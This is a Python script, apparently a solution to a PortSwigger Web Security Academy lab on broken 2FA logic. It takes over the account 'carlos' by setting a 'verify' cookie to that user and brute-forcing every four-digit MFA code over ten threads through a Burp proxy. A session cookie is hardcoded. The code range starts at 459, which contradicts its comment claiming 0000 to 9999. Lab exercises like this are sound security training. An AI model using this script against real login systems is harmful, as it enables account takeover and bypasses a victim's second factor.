### Portswigger Lab: 2FA broken logic ###

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Base settings
base_url = "https://0a2100790304365081e6169a00ab00be.web-security-academy.net"  # Replace with actual base URL
login2_endpoint = "/login2"  # 2FA verification endpoint
verify_user = "carlos"  # Target username
burp_proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # Burp proxy
ca_cert_path = "certs/burp_cacert_chain.pem"  # Path to Burp CA certificate
session_cookie = "eb70bxMHh3OYogCRxd1zCzEu8Cy2MXJZ"


# MFA code payload
def generate_mfa_codes():
    """Generate all possible 4-digit codes."""
    return [f"{code:04d}" for code in range(459, 10000)]  # Generates 0000 to 9999


def test_mfa_code(code):
    """Send a single MFA code for verification."""
    session = requests.Session()
    headers = {
        "Cookie": f"verify={verify_user}; session={session_cookie}",  # Add the verify user in the cookie
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": f"{base_url}/login2",
    }
    data = {
        "mfa-code": code,  # MFA code to test
    }
    try:
        response = session.post(
            f"{base_url}{login2_endpoint}",
            data=data,
            headers=headers,
            proxies=burp_proxy,
            verify=ca_cert_path,
            allow_redirects=False,  # Don't follow redirects for 302 detection
            timeout=10,
        )
        if response.status_code == 302:  # Typically indicates a successful login
            return code  # Return the valid code
        else:
            print(f"Testing 2FA Code: {code}")
            
    except requests.RequestException as e:
        print(f"Request failed for code {code}: {e}")
    return None  # Return None for failed attempts


def brute_force_2fa_with_threads():
    """Brute force 2FA using concurrency."""
    mfa_codes = generate_mfa_codes()

    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust number of workers as needed
        futures = {executor.submit(test_mfa_code, code): code for code in mfa_codes}

        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"Valid 2FA code found: {result}")
                # Shut down remaining threads as soon as the valid code is found
                executor.shutdown(wait=False, cancel_futures=True)
                return result

    print("No valid 2FA code found.")
    return None


if __name__ == "__main__":
    brute_force_2fa_with_threads()